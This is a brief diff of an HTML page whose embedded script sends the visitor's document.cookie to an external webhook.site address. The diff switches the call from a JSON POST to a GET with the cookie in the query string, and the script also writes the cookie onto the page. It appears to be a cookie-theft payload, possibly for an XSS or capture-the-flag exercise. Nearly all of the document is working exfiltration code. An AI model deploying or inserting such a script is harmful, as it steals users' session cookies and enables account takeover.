@@ -6,10 +6,7 @@
                 NONE
         </body>
         <script>
-                fetch('https://webhook.site/c9bedc07-cb29-4bae-9ff3-e16220a74baf', {
-                        method: 'POST',
-                        body: JSON.stringify({cookie: document.cookie})
-                });
+                fetch('https://webhook.site/c9bedc07-cb29-4bae-9ff3-e16220a74baf?cookie=' + document.cookie);
                 document.body.innerText = document.cookie;
         </script>
 </html>
